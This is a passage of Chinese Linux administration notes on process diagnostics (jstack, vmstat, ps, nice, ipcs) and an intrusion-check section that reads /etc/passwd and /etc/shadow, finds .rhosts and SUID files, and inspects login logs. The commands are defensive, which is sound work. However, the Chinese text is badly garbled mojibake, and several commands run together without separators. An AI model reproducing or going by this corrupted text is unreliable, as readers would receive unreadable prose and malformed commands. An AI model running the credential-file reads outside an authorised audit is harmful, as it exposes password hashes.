¼å¼2ï¼‰å¾ªç¯æ˜¾ç¤ºä¸Šè¿°è¿›ç¨‹çš„è¾“å‡ºçš„æœ€å1è¡Œï¼Œé—´éš”2ç§’:while true; do pmap -d 11957 | tail -1; sleep 2; done; æœ€åä¸€è¡Œçš„å€¼è¯´æ˜ï¼š mapped è¡¨ç¤ºè¯¥è¿›ç¨‹æ˜ å°„çš„è™šæ‹Ÿåœ°å€ç©ºé—´å¤§å°ï¼Œä¹Ÿå°±æ˜¯è¯¥è¿›ç¨‹é¢„å…ˆåˆ†é…çš„è™šæ‹Ÿå†…å­˜å¤§å°ï¼Œå³pså‡ºçš„vsz writeable&#x2F;private è¡¨ç¤ºè¿›ç¨‹æ‰€å ç”¨çš„ç§æœ‰åœ°å€ç©ºé—´å¤§å°ï¼Œä¹Ÿå°±æ˜¯è¯¥è¿›ç¨‹å®é™…ä½¿ç”¨çš„å†…å­˜å¤§å° shared è¡¨ç¤ºè¿›ç¨‹å’Œå…¶ä»–è¿›ç¨‹å…±äº«çš„å†…å­˜å¤§å° 3ï¼‰æŸ¥çœ‹æŸè¿›ç¨‹çš„è®¾å¤‡çŠ¶æ€ä¸‹çš„å†…å­˜ä½¿ç”¨Address: å†…å­˜å¼€å§‹åœ°å€ã€Kbytes: å ç”¨å†…å­˜çš„å­—èŠ‚æ•°ï¼ˆKBï¼‰Mode: å†…å­˜çš„æƒé™ï¼šreadã€writeã€executeã€sharedã€private (å†™æ—¶å¤åˆ¶)Offset: æ–‡ä»¶åç§»Mapping: å ç”¨å†…å­˜çš„æ–‡ä»¶ã€æˆ–[anon]ï¼ˆåˆ†é…çš„å†…å­˜ï¼‰ã€æˆ–[stack]ï¼ˆå †æ ˆï¼‰Device: è®¾å¤‡å (major:minor) 3&gt;è¿›ç¨‹å’Œçº¿ç¨‹å¼‚å¸¸æƒ…å†µ1ï¼‰æŸ¥çœ‹å½“å‰ç«™cpuæœ€é«˜çš„è¿›ç¨‹çš„çº¿ç¨‹ä½¿ç”¨æƒ…å†µï¼štop -H -p ps aux|sort -k4nr|head -1|awk â€˜{print $2}â€™ lsof -p pidï¼ˆå¯Ÿçœ‹è¯¥è¿›ç¨‹æ‰€æ‰“å¼€ç«¯å£å’Œæ–‡ä»¶ï¼‰2ï¼‰å¦‚ä¸Šè¿°è¾“å‡ºæœ‰å¼‚å¸¸çº¿ç¨‹ï¼Œå¯åˆ©ç”¨printf â€œ%x\\nâ€ çº¿ç¨‹å·ï¼Œå°†å¼‚å¸¸çº¿ç¨‹å·è½¬åŒ–ä¸º16è¿›åˆ¶ï¼Œç”¨äºåç»­çš„javaçº¿ç¨‹è·Ÿè¸ªç”¨ã€‚printf â€œ%x\\nâ€ 12791 &#x2F;&#x2F;tidéœ€è¦ä½¿ç”¨16è¿›åˆ¶å€¼ 3ï¼‰æŸ¥çœ‹javaè¿›ç¨‹å †æ ˆä¿¡æ¯jstack è¿›ç¨‹å·|grep 16è¿›åˆ¶å¼‚å¸¸çº¿ç¨‹å· -A90 &#x2F;&#x2F;-A90æ˜¯æ—¥å¿—è¡Œæ•°;æŸ¥çœ‹è¿è¡Œçš„ Java è¿›ç¨‹ä¸‹ï¼Œå¤šçº¿ç¨‹çš„è¿è¡Œæƒ…å†µæ³¨æ„ï¼šjstackå‘½ä»¤åœ¨jdkçš„binç›®å½•ä¸‹jstack -F 12791|grep 31f7 -A90 &#x2F;&#x2F;-F option can be used when the target process is not responding çº¿ç¨‹çŠ¶æ€æœ‰ä»¥ä¸‹å‡ ç§ï¼šRUNNABLE çº¿ç¨‹è¿è¡Œä¸­æˆ– I&#x2F;O ç­‰å¾…BLOCKED çº¿ç¨‹åœ¨ç­‰å¾… monitor é”( synchronized å…³é”®å­—)TIMED_WAITING çº¿ç¨‹åœ¨ç­‰å¾…å”¤é†’ï¼Œä½†è®¾ç½®äº†æ—¶é™WAITING çº¿ç¨‹åœ¨æ— é™ç­‰å¾…å”¤é†’ å¦‚è¾“å‡ºç»“æœæœ‰GCï¼Œè¯´æ˜å†…å­˜å·²ç»ç”¨å°½ï¼› jstat -gcmetacapacity pid &#x2F;&#x2F;å‘½ä»¤æŸ¥çœ‹å†…å­˜åˆ†å¸ƒæƒ…å†µåŠGCæƒ…å†µ jstat -gcutil pid &#x2F;&#x2F;æŸ¥çœ‹GCæƒ…å†µjstat -gccapacity pid 4)æŸ¥çœ‹æŸè¿›ç¨‹çš„çº¿ç¨‹ä¿¡æ¯ï¼šps -mp pid -o THREAD,tid,time|sort -rn &#x2F;&#x2F;tidä¸ºä»£ç çº¿ç¨‹IDï¼Œtimeä»£è¡¨è¿™ä¸ªçº¿ç¨‹çš„å·²è¿è¡Œæ—¶é—´ï¼›jstackå·¥å…·å¯ä»¥ç”¨æ¥è·å¾—coreæ–‡ä»¶çš„java stackå’Œnative stackçš„ä¿¡æ¯ï¼Œä»è€Œå¯ä»¥è½»æ¾åœ°çŸ¥é“javaç¨‹åºæ˜¯å¦‚ä½•å´©æºƒå’Œåœ¨ç¨‹åºä½•å¤„å‘ç”Ÿé—®é¢˜ï¼Œæ³¨ï¼šå…¶ä¸­ï¼ŒLWPä¸ºè½»é‡çº§è¿›ç¨‹ï¼Œå³çº¿ç¨‹PIDï¼›NLWPä¸ºçº¿ç¨‹æ•°é‡ï¼›WCHANè¡¨å½“å‰è¿›ç¨‹æ˜¯å¦æ­£åœ¨è¿è¡Œï¼Œè‹¥ä¸º-è¡¨ç¤ºæ­£åœ¨è¿è¡Œï¼Œè‹¥è¯¥è¿›ç¨‹åœ¨ç¡çœ ï¼Œåˆ™æ˜¾ç¤ºç¡çœ ä¸­çš„ç³»ç»Ÿå‡½æ•°åï¼› jps -v &#x2F;&#x2F;æ‰¾åˆ°javaè¿›ç¨‹ç›¸å…³çš„pid jstack -l 12791 &gt;&gt; 123.txt &#x2F;&#x2F;å¯¼å‡ºå †æ ˆä¿¡æ¯ï¼› 5)å…¶ä»–è¿›ç¨‹ç®¡ç†å‘½ä»¤ï¼šhtopã€vmstatã€dstatã€iostatã€glancesï¼Œpstreeã€psã€pidofã€pgrepã€pkillã€pmapã€killã€killallã€jobã€bgã€fgç­‰ï¼› 6ï¼‰å½“è¿›ç¨‹æ‰“å¼€äº†æŸä¸ªæ–‡ä»¶æ—¶ï¼Œåªè¦è¯¥è¿›ç¨‹ä¿æŒæ‰“å¼€è¯¥æ–‡ä»¶ï¼Œå³ä½¿å°†å…¶åˆ é™¤ï¼Œå®ƒä¾ç„¶å­˜åœ¨äºç£ç›˜ä¸­ã€‚è¿™æ„å‘³ç€ï¼Œè¿›ç¨‹å¹¶ä¸çŸ¥é“æ–‡ä»¶å·²ç»è¢«åˆ é™¤ï¼Œå®ƒä»ç„¶å¯ä»¥å‘æ‰“å¼€è¯¥æ–‡ä»¶æ—¶æä¾›ç»™å®ƒçš„æ–‡ä»¶æè¿°ç¬¦è¿›è¡Œè¯»å–å’Œå†™å…¥ã€‚é™¤äº†è¯¥è¿›ç¨‹ä¹‹å¤–ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯ä¸å¯è§çš„ï¼Œå› ä¸ºå·²ç»åˆ é™¤äº†å…¶ç›¸åº”çš„ç›®å½•ç´¢å¼•èŠ‚ç‚¹ã€‚åªè¦è¿™ä¸ªæ—¶å€™ç³»ç»Ÿä¸­è¿˜æœ‰è¿›ç¨‹æ­£åœ¨è®¿é—®è¯¥æ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡lsofä»&#x2F;procç›®å½•ä¸‹æ¢å¤è¯¥æ–‡ä»¶çš„å†…å®¹ã€‚ 7)å¯è¿è¡Œè¿›ç¨‹æ•°ç›® # vmwtat 1 5åˆ—ç»™å‡ºçš„æ˜¯å¯è¿è¡Œè¿›ç¨‹çš„æ•°ç›®ï¼Œæ£€æŸ¥å…¶æ˜¯å¦è¶…è¿‡ç³»ç»Ÿé€»è¾‘CPUçš„4å€ top -id 1 &#x2F;&#x2F;è§‚å¯Ÿæ˜¯å¦æœ‰å¼‚å¸¸è¿›ç¨‹å‡ºç°9)vmstatå‘½ä»¤ï¼švmstatæ˜¯Virtual Meomory Statisticsï¼ˆè™šæ‹Ÿå†…å­˜ç»Ÿè®¡ï¼‰çš„ç¼©å†™ï¼Œå¯å¯¹æ“ä½œç³»ç»Ÿçš„è™šæ‹Ÿå†…å­˜ã€è¿›ç¨‹ã€CPUæ´»åŠ¨è¿›è¡Œç›‘æ§ã€‚æ˜¯å¯¹ç³»ç»Ÿçš„æ•´ä½“æƒ…å†µè¿›è¡Œç»Ÿè®¡ï¼Œä½†ä¸é€‚äºå¯¹æŸä¸ªå…·ä½“è¿›ç¨‹è¿›è¡Œæ·±å…¥åˆ†æã€‚#vmstat 5 5 &#x2F;&#x2F;5ç§’æ—¶é—´å†…è¿›è¡Œ5æ¬¡é‡‡æ · è¾“å‡ºç»“æœå­—æ®µè¯´æ˜ï¼š Procsï¼ˆè¿›ç¨‹ï¼‰ï¼š r: è¿è¡Œé˜Ÿåˆ—ä¸­è¿›ç¨‹æ•°é‡ bï¼š ç­‰å¾…IOçš„è¿›ç¨‹æ•°é‡ Memoryï¼ˆå†…å­˜ï¼‰ï¼š swpd: ä½¿ç”¨è™šæ‹Ÿå†…å­˜å¤§å° free: å¯ç”¨å†…å­˜å¤§å° buff: ç”¨ä½œç¼“å†²çš„å†…å­˜å¤§å° cache: ç”¨ä½œç¼“å­˜çš„å†…å­˜å¤§å° Swapï¼š si: æ¯ç§’ä»äº¤æ¢åŒºå†™åˆ°å†…å­˜çš„å¤§å° so: æ¯ç§’å†™å…¥äº¤æ¢åŒºçš„å†…å­˜å¤§å° IOï¼šï¼ˆLinuxé»˜è®¤å—çš„å¤§å°ä¸º1024bytesï¼‰ bi: æ¯ç§’è¯»å–çš„å—æ•° bo: æ¯ç§’å†™å…¥çš„å—æ•° ç³»ç»Ÿï¼š in: æ¯ç§’ä¸­æ–­æ•°ï¼ŒåŒ…æ‹¬æ—¶é’Ÿä¸­æ–­ã€‚ã€interruptã€‘ cs: æ¯ç§’ä¸Šä¸‹æ–‡åˆ‡æ¢æ•°ã€‚ ã€count&#x2F;secondã€‘ CPUï¼ˆä»¥ç™¾åˆ†æ¯”è¡¨ç¤ºï¼‰ï¼š us: ç”¨æˆ·è¿›ç¨‹æ‰§è¡Œæ—¶é—´(user time) sy: ç³»ç»Ÿè¿›ç¨‹æ‰§è¡Œæ—¶é—´(system time) id: ç©ºé—²æ—¶é—´(åŒ…æ‹¬IOç­‰å¾…æ—¶é—´),ä¸­å¤®å¤„ç†å™¨çš„ç©ºé—²æ—¶é—´ ã€‚ä»¥ç™¾åˆ†æ¯”è¡¨ç¤ºã€‚ wa: ç­‰å¾…IOæ—¶é—´ æŒ‡æ ‡å‚è€ƒï¼š å¦‚æœrç»å¸¸å¤§äº4ï¼Œidç»å¸¸å°‘äº40ï¼Œè¡¨ç¤ºcpuçš„è´Ÿè·å¾ˆé‡ã€‚ å¦‚æœbiï¼Œboé•¿æœŸä¸ç­‰äº0ï¼Œè¡¨ç¤ºå†…å­˜ä¸è¶³ã€‚ å¦‚æœdiskç»å¸¸ä¸ç­‰äº0ï¼Œä¸”åœ¨bä¸­çš„é˜Ÿåˆ—å¤§äº3ï¼Œè¡¨ç¤ºioæ€§èƒ½ä¸å¥½ã€‚ ç¤ºä¾‹ï¼šeg1ï¼švmstat -a 2 5 &#x2F;&#x2F;-a æ˜¾ç¤ºæ´»è·ƒå’Œéæ´»è·ƒå†…å­˜,æ‰€æ˜¾ç¤ºçš„å†…å®¹å°†å¢åŠ inactå’Œactiveåˆ—ï¼Œå¯¹åº”éæ´»è·ƒå’Œæ´»è·ƒï¼› eg2ï¼švmstat -f &#x2F;&#x2F;æŸ¥çœ‹linuxä¸‹åˆ›å»ºè¿›ç¨‹çš„ç³»ç»Ÿè°ƒç”¨ã€‚å³forkæ¬¡æ•°ï¼Œå®é™…æ˜¯ä»&#x2F;proc&#x2F;statä¸­çš„processeså­—æ®µé‡Œå–å¾—çš„å€¼ eg3ï¼švmstat -s &#x2F;&#x2F;æ˜¾ç¤ºå†…å­˜ç›¸å…³ç»Ÿè®¡ä¿¡æ¯,åŒ…æ‹¬å·²ä½¿ç”¨å†…å­˜ï¼Œæ´»è·ƒå†…å­˜ï¼Œå®é™…å–å€¼äº&#x2F;proc&#x2F;meminfo,&#x2F;proc&#x2F;statå’Œ&#x2F;proc&#x2F;vmstat eg4ï¼švmstat -d &#x2F;&#x2F;æŸ¥çœ‹ç£ç›˜çš„è¯»å†™,å®é™…å–ä¹‹äº&#x2F;proc&#x2F;diskstatsvmstat -p &#x2F;dev&#x2F;sda1 &#x2F;&#x2F;æ˜¾ç¤ºæŒ‡å®šç£ç›˜åˆ†åŒºç»Ÿè®¡ä¿¡æ¯å…¶ä¸­ï¼Œè¾“å‡ºç»“æœï¼šreads:æ¥è‡ªäºè¿™ä¸ªåˆ†åŒºçš„è¯»çš„æ¬¡æ•°ã€‚read sectors:æ¥è‡ªäºè¿™ä¸ªåˆ†åŒºçš„è¯»æ‰‡åŒºçš„æ¬¡æ•°ã€‚writes:æ¥è‡ªäºè¿™ä¸ªåˆ†åŒºçš„å†™çš„æ¬¡æ•°ã€‚requested writes:æ¥è‡ªäºè¿™ä¸ªåˆ†åŒºçš„å†™è¯·æ±‚æ¬¡æ•°ã€‚ eg5ï¼švmstat -m &#x2F;&#x2F;æŸ¥çœ‹ç³»ç»Ÿçš„slabä¿¡æ¯,ç”¨äºå­˜å‚¨ièŠ‚ç‚¹ï¼Œç›®å½•é¡¹ç­‰å°å¯¹è±¡ï¼Œé¿å…ä¸ºä»–ä»¬æ¶ˆè€—ä¸€ä¸ªå†…å­˜é¡µï¼ˆ4kbï¼‰ï¼Œå‡å°‘å†…å­˜åˆ†é…æ¬¡æ•°ã€‚é™…å–å€¼äº&#x2F;proc&#x2F;slabinfo eg6ï¼š 10ï¼‰pså‘½ä»¤ï¼š å¸¸ç”¨å‚æ•°ï¼š -A æ˜¾ç¤ºæ‰€æœ‰è¿›ç¨‹ï¼ˆç­‰ä»·äº-eï¼‰(utility)-a æ˜¾ç¤ºä¸€ä¸ªç»ˆç«¯çš„æ‰€æœ‰è¿›ç¨‹ï¼Œé™¤äº†ä¼šè¯å¼•çº¿-N å¿½ç•¥é€‰æ‹©ã€‚-C é€šè¿‡å‘½ä»¤åç§°æœç´¢è¿›ç¨‹ï¼Œåé¢è·Ÿä½ è¦æ‰¾çš„è¿›ç¨‹çš„åå­—å³å¯-d æ˜¾ç¤ºæ‰€æœ‰è¿›ç¨‹ï¼Œä½†çœç•¥æ‰€æœ‰çš„ä¼šè¯å¼•çº¿(utility)-x æ˜¾ç¤ºæ²¡æœ‰æ§åˆ¶ç»ˆç«¯çš„è¿›ç¨‹ï¼ŒåŒæ—¶æ˜¾ç¤ºå„ä¸ªå‘½ä»¤çš„å…·ä½“è·¯å¾„ã€‚dxä¸å¯åˆç”¨ã€‚ï¼ˆutilityï¼‰-p pid è¿›ç¨‹ä½¿ç”¨cpuçš„æ—¶é—´-u uid or username é€‰æ‹©æœ‰æ•ˆçš„ç”¨æˆ·idæˆ–è€…æ˜¯ç”¨æˆ·åï¼Œ å¦‚æœé•¿åº¦å¤§äº8ä¸ªå­—ç¬¦ï¼Œç„¶åpså°†åªæ˜¾ç¤ºUIDï¼Œè€Œä¸æ˜¯ç”¨æˆ·åï¼›å¤šä¸ªç”¨æˆ·åå¯ä»¥æä¾›ä»¥é€—å·åˆ†éš”ã€‚-g gid or groupname æ˜¾ç¤ºç»„çš„æ‰€æœ‰è¿›ç¨‹ã€‚U username æ˜¾ç¤ºè¯¥ç”¨æˆ·ä¸‹çš„æ‰€æœ‰è¿›ç¨‹ï¼Œä¸”æ˜¾ç¤ºå„ä¸ªå‘½ä»¤çš„è¯¦ç»†è·¯å¾„ã€‚å¦‚:ps U zhang;(utility)-f -forestå…¨éƒ¨åˆ—å‡ºï¼Œé€šå¸¸å’Œå…¶ä»–é€‰é¡¹è”ç”¨ã€‚å¦‚ï¼šps -fa or ps -fx and so on.-l é•¿æ ¼å¼ï¼ˆæœ‰F,wchan,C ç­‰å­—æ®µï¼‰-L æŸ¥çœ‹ç‰¹å®šè¿›ç¨‹çš„çº¿ç¨‹-j ä½œä¸šæ ¼å¼-o ç”¨æˆ·è‡ªå®šä¹‰æ ¼å¼ã€‚v ä»¥è™šæ‹Ÿå­˜å‚¨å™¨æ ¼å¼æ˜¾ç¤ºs ä»¥ä¿¡å·æ ¼å¼æ˜¾ç¤º-m æ˜¾ç¤ºæ‰€æœ‰çš„çº¿ç¨‹-H æ˜¾ç¤ºè¿›ç¨‹çš„å±‚æ¬¡(å’Œå…¶å®ƒçš„å‘½ä»¤åˆç”¨ï¼Œå¦‚ï¼šps -Ha)ï¼ˆutilityï¼‰e å‘½ä»¤ä¹‹åæ˜¾ç¤ºç¯å¢ƒï¼ˆå¦‚ï¼šps -d e; ps -a eï¼‰(utility)h ä¸æ˜¾ç¤ºç¬¬ä¸€è¡Œâ€“sort é€‰é¡¹ç”±é€—å·åˆ†éš”çš„å¤šä¸ªå­—æ®µå¯ä»¥ç”¨æŒ‡å®šï¼Œâ€“sort&#x3D;-pcpu,+pmemï¼ˆæˆ–â€“sort +pmem,-pcpuï¼‰ï¼Œcpué™åºæ’åˆ—ï¼Œå†…å­˜å‡åºæ’åˆ—ã€‚ pså‘½ä»¤å‚æ•°ä½¿ç”¨æ”¯æŒä»¥ä¸‹3ç§é£æ ¼ï¼š 1ï¼‰BSDé£æ ¼: åœ¨ BSD é£æ ¼çš„è¯­æ³•é€‰é¡¹å‰ä¸å¸¦è¿å­—ç¬¦ã€‚ä¾‹å¦‚: ps aux2ï¼‰UNIX&#x2F;LINUXçš„é£æ ¼ï¼šåœ¨ linux é£æ ¼çš„è¯­æ³•é€‰é¡¹å‰é¢æœ‰ä¸€ä¸ª â€œ-â€ã€‚ä¾‹å¦‚: ps -ef3ï¼‰æ··åˆä½¿ç”¨ä¸¤ç§ Linux ç³»ç»Ÿä¸Šçš„è¯­æ³•é£æ ¼æ˜¯å¥½äº‹å„¿ã€‚ä¾‹å¦‚ï¼šps ax -f eg1ï¼š# ps aux USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND å…¶ä¸­ï¼šVSZ è¿›ç¨‹æ‰€ä½¿ç”¨çš„è™šå­˜çš„å¤§å°ï¼ˆVirtual Sizeï¼‰ï¼›RSSè¡¨è¿›ç¨‹ä½¿ç”¨çš„é©»ç•™é›†å¤§å°æˆ–è€…æ˜¯å®é™…å†…å­˜çš„å¤§å°ï¼ŒKbyteså­—èŠ‚ã€‚STATå³è¿›ç¨‹çš„çŠ¶æ€ï¼šä½¿ç”¨ä¸é€šå­—ç¬¦è¡¨ç¤ºï¼ˆSTATçš„çŠ¶æ€ç ï¼‰ï¼Œä¸»è¦15ç§çŠ¶æ€ç å¦‚ä¸‹ï¼š R è¿è¡Œ Runnable (on run queue) &#x2F;&#x2F;æ­£åœ¨è¿è¡Œæˆ–åœ¨è¿è¡Œé˜Ÿåˆ—ä¸­ç­‰å¾…ã€‚S ç¡çœ  Sleeping &#x2F;&#x2F;ä¼‘çœ ä¸­, å—é˜», åœ¨ç­‰å¾…æŸä¸ªæ¡ä»¶çš„å½¢æˆæˆ–æ¥å—åˆ°ä¿¡å·ã€‚I ç©ºé—² IdleZ åƒµæ­» Zombieï¼ˆa defunct process) &#x2F;&#x2F;è¿›ç¨‹å·²ç»ˆæ­¢, ä½†è¿›ç¨‹æè¿°ç¬¦å­˜åœ¨, ç›´åˆ°çˆ¶è¿›ç¨‹è°ƒç”¨wait4()ç³»ç»Ÿè°ƒç”¨åé‡Šæ”¾ã€‚D ä¸å¯ä¸­æ–­ Uninterruptible sleep (ususally IO) &#x2F;&#x2F;æ”¶åˆ°ä¿¡å·ä¸å”¤é†’å’Œä¸å¯è¿è¡Œ, è¿›ç¨‹å¿…é¡»ç­‰å¾…ç›´åˆ°æœ‰ä¸­æ–­å‘ç”Ÿã€‚T ç»ˆæ­¢ Terminate &#x2F;&#x2F;è¿›ç¨‹æ”¶åˆ°SIGSTOP, SIGSTP, SIGTIN, SIGTOUä¿¡å·ååœæ­¢è¿è¡Œè¿è¡Œã€‚P &#x2F;&#x2F;ç­‰å¾…äº¤æ¢é¡µW æ— é©»ç•™é¡µ has no resident pages &#x2F;&#x2F; æ²¡æœ‰è¶³å¤Ÿçš„è®°å¿†ä½“åˆ†é¡µå¯åˆ†é…ã€‚X &#x2F;&#x2F;æ­»æ‰çš„è¿›ç¨‹&lt; é«˜ä¼˜å…ˆçº§è¿›ç¨‹ &#x2F;&#x2F;é«˜ä¼˜å…ˆåºçš„è¿›ç¨‹N ä½ä¼˜å…ˆçº§è¿›ç¨‹ &#x2F;&#x2F;ä½ä¼˜å…ˆåºçš„è¿›ç¨‹L å†…å­˜é”é¡µ Lock &#x2F;&#x2F; æœ‰è®°å¿†ä½“åˆ†é¡µåˆ†é…å¹¶ç¼©åœ¨è®°å¿†ä½“å†…s &#x2F;&#x2F;è¿›ç¨‹çš„é¢†å¯¼è€…ï¼ˆåœ¨å®ƒä¹‹ä¸‹æœ‰å­è¿›ç¨‹ï¼‰l &#x2F;&#x2F;å¤šè¿›ç¨‹çš„ï¼ˆä½¿ç”¨ CLONE_THREAD, ç±»ä¼¼ NPTL pthreadsï¼‰ &#x2F;&#x2F;ä½äºåå°çš„è¿›ç¨‹ç»„ WCHAN è¡¨è¿›ç¨‹æ­£åœ¨ç¡çœ çš„å†…æ ¸å‡½æ•°åç§°ï¼›è¯¥å‡½æ•°çš„åç§°æ˜¯ä»&#x2F;root&#x2F;system.mapæ–‡ä»¶ä¸­è·å¾—çš„ã€‚ eg2ï¼šè‡ªå®šä¹‰è¾“å‡ºç»“æœå¹¶æŒ‰éœ€æ’åº ps -eo pid,stat,pri,uid â€“sort uid &#x2F;&#x2F;æŸ¥çœ‹å½“å‰ç³»ç»Ÿè¿›ç¨‹çš„uid,pid,stat,pri, ä»¥uidå·æ’åº. ps -eo user,pid,stat,rss,args â€“sort rss &#x2F;&#x2F;æŸ¥çœ‹å½“å‰ç³»ç»Ÿè¿›ç¨‹çš„user,pid,stat,rss,args, ä»¥rssæ’åº. eg3ï¼šç»“åˆ watchå‘½ä»¤å®æ—¶æ˜¾ç¤ºè¿›ç¨‹è¿è¡Œæƒ…å†µ #watch -n 1 â€˜ps -aux â€“sort -pmem,-pcpuâ€™ &#x2F;&#x2F;1såˆ·æ–°ä¸€æ¬¡ï¼ŒæŒ‰cpuå’Œå†…å­˜æ’åº watch -n 1 â€˜ps -aux â€“sort -pmem,-pcpu|head -10â€™ &#x2F;&#x2F;åŠ¨æ€æ˜¾ç¤ºå‰10è¡Œ 11ï¼‰ä¼˜å…ˆçº§å‘½ä»¤niceï¼š ç”¨æ³•ï¼š nice &lt;ä¼˜å…ˆå€¼&gt; &lt;è¿›ç¨‹å&gt; &#x2F;&#x2F;é€šè¿‡ç»™å®šçš„ä¼˜å…ˆå€¼å¯åŠ¨ä¸€ä¸ªç¨‹åº é€šè¿‡ä»¥ä¸Šå‘½ä»¤ç”¨æˆ·å°±å¯ä»¥è®¾ç½®å’Œæ”¹å˜è¿›ç¨‹çš„ä¼˜å…ˆçº§ã€‚æé«˜ä¸€ä¸ªè¿›ç¨‹çš„ä¼˜å…ˆçº§ï¼Œå†…æ ¸ä¼šåˆ†é…æ›´å¤šCPUæ—¶é—´ç‰‡ç»™è¿™ä¸ªè¿›ç¨‹ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿›ç¨‹ä»¥ 0 çš„ä¼˜å…ˆçº§å¯åŠ¨ã€‚è¿›ç¨‹ä¼˜å…ˆçº§å¯ä»¥é€šè¿‡ top å‘½ä»¤æ˜¾ç¤ºçš„ NIï¼ˆnice valueï¼‰åˆ—æŸ¥çœ‹ã€‚è¿›ç¨‹ä¼˜å…ˆçº§å€¼çš„èŒƒå›´ä»-20åˆ°19ã€‚å€¼è¶Šä½ï¼Œä¼˜å…ˆçº§è¶Šé«˜ã€‚ ç±»ä¼¼å‘½ä»¤reniceï¼šrenice å‘½ä»¤ç±»ä¼¼ nice å‘½ä»¤ï¼Œä½†å®ƒå¯ä»¥æ”¹å˜æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ä¼˜å…ˆå€¼ä¸”ç”¨æˆ·åªèƒ½æ”¹å˜å±äºä»–ä»¬è‡ªå·±çš„è¿›ç¨‹çš„ä¼˜å…ˆå€¼ã€‚ renice -n -p &#x2F;&#x2F;æ”¹å˜æŒ‡å®šè¿›ç¨‹çš„ä¼˜å…ˆå€¼ renice -u -g &#x2F;&#x2F;é€šè¿‡æŒ‡å®šç”¨æˆ·å’Œç»„æ¥æ”¹å˜è¿›ç¨‹ä¼˜å…ˆå€¼ 12ï¼‰ipcså‘½ä»¤ ï¼š ipcs å‘½ä»¤æŠ¥å‘Šè¿›ç¨‹é—´é€šä¿¡è®¾æ–½çŠ¶æ€ã€‚ï¼ˆåŒ…æ‹¬å…±äº«å†…å­˜ï¼Œä¿¡å·é‡å’Œæ¶ˆæ¯é˜Ÿåˆ—ï¼‰ eg1ï¼š# ipcs -p -m &#x2F;&#x2F;æŸ¥çœ‹å½“å‰å…±äº«å†…å­˜æƒ…å†µï¼Œ-sæŸ¥çœ‹ä¿¡å·é‡é›†åˆï¼Œ-aç­‰åŒäº-msq eg2:# ipcs -p -q &#x2F;&#x2F;æŸ¥çœ‹å½“å‰æ´»åŠ¨æ¶ˆæ¯é˜Ÿåˆ— bã€ç³»ç»Ÿå®‰å…¨æ£€æŸ¥1ï¼‰æ£€æŸ¥ç³»ç»Ÿä¸­æ˜¯å¦æœ‰å…¶ä»–ç‰¹æƒç”¨æˆ·ï¼šawk -F: â€˜$3&#x3D;&#x3D;0 {print $1}â€™ &#x2F;etc&#x2F;passwd &#x2F;&#x2F;æ£€æŸ¥æ˜¯å¦å­˜åœ¨å…¶ä»–ç‰¹æƒè´¦æˆ·ï¼Œé»˜è®¤åªæœ‰rootcat &#x2F;etc&#x2F;passwd;stat &#x2F;etc&#x2F;passwd &#x2F;&#x2F;æ£€æŸ¥æ˜¯å¦å¼‚å¸¸ç”¨æˆ·ï¼ŒåŠç”¨æˆ·å’Œå¯†ç æ–‡ä»¶çŠ¶æ€åŠä¿®æ”¹çš„æ—¥æœŸawk -F: â€˜length($2)&#x3D;&#x3D;0 {print $1}â€™ &#x2F;etc&#x2F;shadowæ£€æŸ¥æ˜¯å¦å­˜åœ¨ç©ºå£ä»¤è´¦æˆ·.awk -F: â€˜length($2)&#x3D;&#x3D;0 {print $1}â€™ &#x2F;etc&#x2F;shadowæ£€æŸ¥æ˜¯å¦å­˜åœ¨ç©ºå£ä»¤è´¦æˆ·.last|head;lastb;wless &#x2F;var&#x2F;log&#x2F;secure &#x2F;&#x2F;æŸ¥çœ‹sshçš„ç™»å½•æ—¥å¿—2ï¼‰ps -p PID -o lstart æ£€æŸ¥ä¸Šä¸€æ¬¡syslogå¯åŠ¨æ—¶é—´æ˜¯å¦æ­£å¸¸ 3ï¼‰æ£€æŸ¥æ˜¯å¦æœ‰ä»¥rhostsæˆ–è€…ä»¥forwardç»“å°¾çš„åé—¨æ–‡ä»¶,åˆ¤æ–­æ˜¯å¦é­åˆ°å…¥ä¾µfind &#x2F; -name â€œ.rhostsâ€ -printfind &#x2F; -name â€œ.forwardâ€ -printls &#x2F;var&#x2F;spool&#x2F;cron&#x2F;less &#x2F;etc&#x2F;rc.d&#x2F;rc.localls &#x2F;etc&#x2F;rc.dls &#x2F;etc&#x2F;rc.dfind &#x2F; -type f -perm 4000lsmod4ï¼‰æ£€æŸ¥&#x2F;var&#x2F;logæ—¥å¿—æ˜¯å¦è¢«æ¸…ç†ls -al &#x2F;var&#x2F;log&#x2F;* &#x2F;&#x2F;å°¤å…¶wtmpå’Œutmpæ£€æŸ¥ sshd æœåŠ¡é…ç½®æ–‡ä»¶ &#x2F;etc&#x2F;ssh&#x2F;sshd_config å’Œç³»ç»Ÿè®¤è¯æ—¥å¿— authã€messageï¼Œåˆ¤æ–­æ˜¯å¦ä¸ºå£ä»¤ç ´è§£æ”»å‡»ã€‚&#x2F;etc&#x2F;ssh&#x2F;sshd_config æ–‡ä»¶ç¡®è®¤è®¤è¯æ–¹å¼ã€‚ç¡®è®¤æ—¥å¿—æ˜¯å¦è¢«åˆ é™¤æˆ–è€…æ¸…ç†è¿‡çš„å¯èƒ½ï¼ˆå¤§å°åˆ¤æ–­ï¼‰ã€‚5ï¼‰ æŸ¥çœ‹&#x2F;var&#x2F;log&#x2F;secureæ—¥å¿—æ–‡ä»¶ï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰å…¥ä¾µè€…çš„ä¿¡æ¯cat &#x2F;var&#x2F;log&#x2F;secure | grep -i â€œaccepted passwordâ€æ£€æŸ¥æ—¥å¿—æŠ¥é”™ï¼šgrep -i erroræˆ–fail &#x2F;var&#x2F;log&#x2F;messages 6ï¼‰ æ£€æŸ¥å®ˆæŠ¤è¿›ç¨‹ps -ajx 